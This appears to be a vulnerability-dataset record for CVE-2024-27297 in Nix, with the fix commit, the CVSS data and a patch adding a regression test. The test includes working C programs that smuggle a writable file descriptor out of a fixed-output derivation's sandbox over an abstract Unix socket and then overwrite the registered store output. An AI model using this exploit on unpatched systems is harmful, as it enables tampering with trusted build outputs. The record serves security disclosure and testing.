{
  "cve_id": "CVE-2024-27297",
  "github_data": {
    "repository": "NixOS/nix",
    "fix_commit": "f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
    "related_commits": [
      "f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
      "f8170ce9f119e5e6724eb81ff1b5a2d4c0024000"
    ],
    "patch_url": "https://github.com/NixOS/nix/commit/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000.patch",
    "fix_commit_details": {
      "sha": "f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
      "commit_date": "2024-03-07T10:56:24Z",
      "author": {
        "login": "edolstra",
        "type": "User",
        "stats": {
          "total_commits": 9978,
          "average_weekly_commits": 8.744960560911482,
          "total_additions": 0,
          "total_deletions": 0,
          "weeks_active": 965
        }
      },
      "commit_message": {
        "title": "Merge pull request from GHSA-2ffj-w4mj-pg37",
        "length": 64,
        "has_description": true,
        "references_issue": false
      },
      "stats": {
        "total": 257,
        "additions": 256,
        "deletions": 1
      },
      "files": [
        {
          "filename": "doc/manual/rl-next/fod-sandbox-escape.md",
          "status": "added",
          "additions": 14,
          "deletions": 0,
          "patch": "@@ -0,0 +1,14 @@\n+---\n+synopsis: Fix a FOD sandbox escape\n+issues:\n+prs:\n+---\n+\n+Cooperating Nix derivations could send file descriptors to files in the Nix\n+store to each other via Unix domain sockets in the abstract namespace. This\n+allowed one derivation to modify the output of the other derivation, after Nix\n+has registered the path as \"valid\" and immutable in the Nix database.\n+In particular, this allowed the output of fixed-output derivations to be\n+modified from their expected content.\n+\n+This isn't the case any more."
        },
        {
          "filename": "src/libstore/build/local-derivation-goal.cc",
          "status": "modified",
          "additions": 6,
          "deletions": 0,
          "patch": "@@ -2527,6 +2527,12 @@ SingleDrvOutputs LocalDerivationGoal::registerOutputs()\n             [&](const DerivationOutput::CAFixed & dof) {\n                 auto & wanted = dof.ca.hash;\n \n+                // Replace the output by a fresh copy of itself to make sure\n+                // that there's no stale file descriptor pointing to it\n+                Path tmpOutput = actualPath + \".tmp\";\n+                copyFile(actualPath, tmpOutput, true);\n+                renameFile(tmpOutput, actualPath);\n+\n                 auto newInfo0 = newInfoFromCA(DerivationOutput::CAFloating {\n                     .method = dof.ca.method,\n                     .hashAlgo = wanted.algo,"
        },
        {
          "filename": "src/libutil/file-system.cc",
          "status": "modified",
          "additions": 5,
          "deletions": 0,
          "patch": "@@ -628,6 +628,11 @@ void copy(const fs::directory_entry & from, const fs::path & to, bool andDelete)\n     }\n }\n \n+void copyFile(const Path & oldPath, const Path & newPath, bool andDelete)\n+{\n+    return copy(fs::directory_entry(fs::path(oldPath)), fs::path(newPath), andDelete);\n+}\n+\n void renameFile(const Path & oldName, const Path & newName)\n {\n     fs::rename(oldName, newName);"
        },
        {
          "filename": "src/libutil/file-system.hh",
          "status": "modified",
          "additions": 7,
          "deletions": 0,
          "patch": "@@ -186,6 +186,13 @@ void renameFile(const Path & src, const Path & dst);\n  */\n void moveFile(const Path & src, const Path & dst);\n \n+/**\n+ * Recursively copy the content of `oldPath` to `newPath`. If `andDelete` is\n+ * `true`, then also remove `oldPath` (making this equivalent to `moveFile`, but\n+ * with the guaranty that the destination will be \u201cfresh\u201d, with no stale inode\n+ * or file descriptor pointing to it).\n+ */\n+void copyFile(const Path & oldPath, const Path & newPath, bool andDelete);\n \n /**\n  * Automatic cleanup of resources."
        },
        {
          "filename": "tests/nixos/ca-fd-leak/default.nix",
          "status": "added",
          "additions": 90,
          "deletions": 0,
          "patch": "@@ -0,0 +1,90 @@\n+# Nix is a sandboxed build system. But Not everything can be handled inside its\n+# sandbox: Network access is normally blocked off, but to download sources, a\n+# trapdoor has to exist. Nix handles this by having \"Fixed-output derivations\".\n+# The detail here is not important, but in our case it means that the hash of\n+# the output has to be known beforehand. And if you know that, you get a few\n+# rights: you no longer run inside a special network namespace!\n+#\n+# Now, Linux has a special feature, that not many other unices do: Abstract\n+# unix domain sockets! Not only that, but those are namespaced using the\n+# network namespace! That means that we have a way to create sockets that are\n+# available in every single fixed-output derivation, and also all processes\n+# running on the host machine! Now, this wouldn't be that much of an issue, as,\n+# well, the whole idea is that the output is pure, and all processes in the\n+# sandbox are killed before finalizing the output. What if we didn't need those\n+# processes at all? Unix domain sockets have a semi-known trick: you can pass\n+# file descriptors around!\n+# This makes it possible to exfiltrate a file-descriptor with write access to\n+# $out outside of the sandbox. And that file-descriptor can be used to modify\n+# the contents of the store path after it has been registered.\n+\n+{ config, ... }:\n+\n+let\n+  pkgs = config.nodes.machine.nixpkgs.pkgs;\n+\n+  # Simple C program that sends a a file descriptor to `$out` to a Unix\n+  # domain socket.\n+  # Compiled statically so that we can easily send it to the VM and use it\n+  # inside the build sandbox.\n+  sender = pkgs.runCommandWith {\n+    name = \"sender\";\n+    stdenv = pkgs.pkgsStatic.stdenv;\n+  } ''\n+    $CC -static -o $out ${./sender.c}\n+  '';\n+\n+  # Okay, so we have a file descriptor shipped out of the FOD now. But the\n+  # Nix store is read-only, right? .. Well, yeah. But this file descriptor\n+  # lives in a mount namespace where it is not! So even when this file exists\n+  # in the actual Nix store, we're capable of just modifying its contents...\n+  smuggler = pkgs.writeCBin \"smuggler\" (builtins.readFile ./smuggler.c);\n+\n+  # The abstract socket path used to exfiltrate the file descriptor\n+  socketName = \"FODSandboxExfiltrationSocket\";\n+in\n+{\n+  name = \"ca-fd-leak\";\n+\n+  nodes.machine =\n+    { config, lib, pkgs, ... }:\n+    { virtualisation.writableStore = true;\n+      nix.settings.substituters = lib.mkForce [ ];\n+      virtualisation.additionalPaths = [ pkgs.busybox-sandbox-shell sender smuggler pkgs.socat ];\n+    };\n+\n+  testScript = { nodes }: ''\n+    start_all()\n+\n+    machine.succeed(\"echo hello\")\n+    # Start the smuggler server\n+    machine.succeed(\"${smuggler}/bin/smuggler ${socketName} >&2 &\")\n+\n+    # Build the smuggled derivation.\n+    # This will connect to the smuggler server and send it the file descriptor\n+    machine.succeed(r\"\"\"\n+      nix-build -E '\n+        builtins.derivation {\n+          name = \"smuggled\";\n+          system = builtins.currentSystem;\n+          # look ma, no tricks!\n+          outputHashMode = \"flat\";\n+          outputHashAlgo = \"sha256\";\n+          outputHash = builtins.hashString \"sha256\" \"hello, world\\n\";\n+          builder = \"${pkgs.busybox-sandbox-shell}/bin/sh\";\n+          args = [ \"-c\" \"echo \\\"hello, world\\\" > $out; ''${${sender}} ${socketName}\" ];\n+      }'\n+    \"\"\".strip())\n+\n+\n+    # Tell the smuggler server that we're done\n+    machine.execute(\"echo done | ${pkgs.socat}/bin/socat - ABSTRACT-CONNECT:${socketName}\")\n+\n+    # Check that the file was not modified\n+    machine.succeed(r\"\"\"\n+      cat ./result\n+      test \"$(cat ./result)\" = \"hello, world\"\n+    \"\"\".strip())\n+  '';\n+\n+}"
        },
        {
          "filename": "tests/nixos/ca-fd-leak/sender.c",
          "status": "added",
          "additions": 65,
          "deletions": 0,
          "patch": "@@ -0,0 +1,65 @@\n+#include <sys/socket.h>\n+#include <sys/un.h>\n+#include <stdlib.h>\n+#include <stddef.h>\n+#include <stdio.h>\n+#include <unistd.h>\n+#include <fcntl.h>\n+#include <errno.h>\n+#include <string.h>\n+#include <assert.h>\n+\n+int main(int argc, char **argv) {\n+\n+    assert(argc == 2);\n+\n+    int sock = socket(AF_UNIX, SOCK_STREAM, 0);\n+\n+    // Set up a abstract domain socket path to connect to.\n+    struct sockaddr_un data;\n+    data.sun_family = AF_UNIX;\n+    data.sun_path[0] = 0;\n+    strcpy(data.sun_path + 1, argv[1]);\n+\n+    // Now try to connect, To ensure we work no matter what order we are\n+    // executed in, just busyloop here.\n+    int res = -1;\n+    while (res < 0) {\n+        res = connect(sock, (const struct sockaddr *)&data,\n+            offsetof(struct sockaddr_un, sun_path)\n+              + strlen(argv[1])\n+              + 1);\n+        if (res < 0 && errno != ECONNREFUSED) perror(\"connect\");\n+        if (errno != ECONNREFUSED) break;\n+    }\n+\n+    // Write our message header.\n+    struct msghdr msg = {0};\n+    msg.msg_control = malloc(128);\n+    msg.msg_controllen = 128;\n+\n+    // Write an SCM_RIGHTS message containing the output path.\n+    struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);\n+    hdr->cmsg_len = CMSG_LEN(sizeof(int));\n+    hdr->cmsg_level = SOL_SOCKET;\n+    hdr->cmsg_type = SCM_RIGHTS;\n+    int fd = open(getenv(\"out\"), O_RDWR | O_CREAT, 0640);\n+    memcpy(CMSG_DATA(hdr), (void *)&fd, sizeof(int));\n+\n+    msg.msg_controllen = CMSG_SPACE(sizeof(int));\n+\n+    // Write a single null byte too.\n+    msg.msg_iov = malloc(sizeof(struct iovec));\n+    msg.msg_iov[0].iov_base = \"\";\n+    msg.msg_iov[0].iov_len = 1;\n+    msg.msg_iovlen = 1;\n+\n+    // Send it to the othher side of this connection.\n+    res = sendmsg(sock, &msg, 0);\n+    if (res < 0) perror(\"sendmsg\");\n+    int buf;\n+\n+    // Wait for the server to close the socket, implying that it has\n+    // received the commmand.\n+    recv(sock, (void *)&buf, sizeof(int), 0);\n+}"
        },
        {
          "filename": "tests/nixos/ca-fd-leak/smuggler.c",
          "status": "added",
          "additions": 66,
          "deletions": 0,
          "patch": "@@ -0,0 +1,66 @@\n+#include <sys/socket.h>\n+#include <sys/un.h>\n+#include <stdlib.h>\n+#include <stddef.h>\n+#include <stdio.h>\n+#include <unistd.h>\n+#include <assert.h>\n+\n+int main(int argc, char **argv) {\n+\n+    assert(argc == 2);\n+\n+    int sock = socket(AF_UNIX, SOCK_STREAM, 0);\n+\n+    // Bind to the socket.\n+    struct sockaddr_un data;\n+    data.sun_family = AF_UNIX;\n+    data.sun_path[0] = 0;\n+    strcpy(data.sun_path + 1, argv[1]);\n+    int res = bind(sock, (const struct sockaddr *)&data,\n+        offsetof(struct sockaddr_un, sun_path)\n+        + strlen(argv[1])\n+        + 1);\n+    if (res < 0) perror(\"bind\");\n+\n+    res = listen(sock, 1);\n+    if (res < 0) perror(\"listen\");\n+\n+    int smuggling_fd = -1;\n+\n+    // Accept the connection a first time to receive the file descriptor.\n+    fprintf(stderr, \"%s\\n\", \"Waiting for the first connection\");\n+    int a = accept(sock, 0, 0);\n+    if (a < 0) perror(\"accept\");\n+\n+    struct msghdr msg = {0};\n+    msg.msg_control = malloc(128);\n+    msg.msg_controllen = 128;\n+\n+    // Receive the file descriptor as sent by the smuggler.\n+    recvmsg(a, &msg, 0);\n+\n+    struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);\n+    while (hdr) {\n+        if (hdr->cmsg_level == SOL_SOCKET\n+          && hdr->cmsg_type == SCM_RIGHTS) {\n+\n+            // Grab the copy of the file descriptor.\n+            memcpy((void *)&smuggling_fd, CMSG_DATA(hdr), sizeof(int));\n+        }\n+\n+        hdr = CMSG_NXTHDR(&msg, hdr);\n+    }\n+    fprintf(stderr, \"%s\\n\", \"Got the file descriptor. Now waiting for the second connection\");\n+    close(a);\n+\n+    // Wait for a second connection, which will tell us that the build is\n+    // done\n+    a = accept(sock, 0, 0);\n+    fprintf(stderr, \"%s\\n\", \"Got a second connection, rewriting the file\");\n+    // Write a new content to the file\n+    if (ftruncate(smuggling_fd, 0)) perror(\"ftruncate\");\n+    char * new_content = \"Pwned\\n\";\n+    int written_bytes = write(smuggling_fd, new_content, strlen(new_content));\n+    if (written_bytes != strlen(new_content)) perror(\"write\");\n+}"
        },
        {
          "filename": "tests/nixos/default.nix",
          "status": "modified",
          "additions": 3,
          "deletions": 1,
          "patch": "@@ -109,7 +109,7 @@ in\n       nix.package = lib.mkForce pkgs.nixVersions.nix_2_13;\n     };\n   };\n-  \n+\n   # TODO: (nixpkgs update) remoteBuildsSshNg_remote_2_18 = ...\n \n   # Test our Nix as a builder for clients that are older\n@@ -156,4 +156,6 @@ in\n     (system: runNixOSTestFor system ./setuid.nix);\n \n   fetch-git = runNixOSTestFor \"x86_64-linux\" ./fetch-git;\n+\n+  ca-fd-leak = runNixOSTestFor \"x86_64-linux\" ./ca-fd-leak;\n }"
        }
      ],
      "file_patterns": {
        "security_files": 0,
        "config_files": 0,
        "dependency_files": 0,
        "test_files": 4,
        "unique_directories": 5,
        "max_directory_depth": 3
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "8aafc0588594033fc6f1c3e2a36fe6f04559981f",
            "date": "2025-01-14T12:52:08Z",
            "author_login": "edolstra"
          },
          {
            "sha": "0be55f869b9b504b98f26be014a94f1714add8f4",
            "date": "2024-11-14T23:51:22Z",
            "author_login": "puffnfresh"
          },
          {
            "sha": "2cb0ddfe4eb216fab6d826c1056743c152722720",
            "date": "2025-01-13T20:05:28Z",
            "author_login": "Mic92"
          },
          {
            "sha": "a78f998cc786723d7bd52b443340fd74c389f8a9",
            "date": "2025-01-13T12:33:12Z",
            "author_login": "edolstra"
          },
          {
            "sha": "fd053fdcad7bbd0dcff7a2daefd8011235653f06",
            "date": "2025-01-13T08:42:41Z",
            "author_login": "siddarthkay"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": 6.3,
    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L",
    "cwe_id": "CWE-367",
    "description": "Nix is a package manager for Linux and other Unix systems. A fixed-output derivations on Linux can send file descriptors to files in the Nix store to another program running on the host (or another fixed-output derivation) via Unix domain sockets in the abstract namespace. This allows to modify the output of the derivation, after Nix has registered the path as \"valid\" and immutable in the Nix database. In particular, this allows the output of fixed-output derivations to be modified from their expected content. This issue has been addressed in versions 2.3.18 2.18.2 2.19.4 and 2.20.5. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "attack_vector": "ADJACENT_NETWORK",
    "attack_complexity": "LOW"
  },
  "temporal_data": {
    "published_date": "2024-03-11T22:15:55.277",
    "last_modified": "2024-11-21T09:04:16.323",
    "fix_date": "2024-03-07T10:56:24Z"
  },
  "references": [
    {
      "url": "https://github.com/NixOS/nix/commit/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://github.com/NixOS/nix/security/advisories/GHSA-2ffj-w4mj-pg37",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://hackmd.io/03UGerewRcy3db44JQoWvw",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://github.com/NixOS/nix/commit/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://github.com/NixOS/nix/security/advisories/GHSA-2ffj-w4mj-pg37",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://hackmd.io/03UGerewRcy3db44JQoWvw",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:07:38.480984",
    "processing_status": "raw"
  },
  "repository_context": {
    "name": "nix",
    "owner": "NixOS",
    "created_at": "2012-02-08T10:17:59Z",
    "updated_at": "2025-01-14T12:52:15Z",
    "pushed_at": "2025-01-14T13:40:33Z",
    "size": 75780,
    "stars": 13291,
    "forks": 1564,
    "open_issues": 3532,
    "watchers": 13291,
    "has_security_policy": false,
    "default_branch": "master",
    "protected_branches": [
      "0.6-maintenance",
      "0.8-maintenance",
      "0.9-maintenance",
      "0.10-maintenance",
      "1.11-maintenance",
      "2.0-maintenance",
      "2.1-maintenance",
      "2.2-maintenance",
      "2.3-maintenance",
      "2.4-maintenance",
      "2.5-maintenance",
      "2.6-maintenance",
      "2.7-maintenance",
      "2.8-maintenance",
      "2.9-maintenance"
    ],
    "languages": {
      "C++": 3788585,
      "Shell": 521060,
      "Nix": 353193,
      "Meson": 94236,
      "C": 53321,
      "Perl": 27346,
      "Yacc": 18717,
      "XS": 13072,
      "Rust": 11498,
      "Lex": 10146,
      "Python": 7018,
      "Emacs Lisp": 598,
      "Hack": 365,
      "Ruby": 175
    },
    "commit_activity": {
      "total_commits_last_year": 2883,
      "avg_commits_per_week": 55.44230769230769,
      "days_active_last_year": 328
    },
    "security_features": {
      "has_security_policy": false,
      "has_protected_branches": true,
      "has_wiki": false,
      "has_issues": true,
      "allow_forking": true,
      "is_template": false,
      "license": "lgpl-2.1"
    },
    "collected_at": "2025-01-14T13:51:36.208020"
  }
}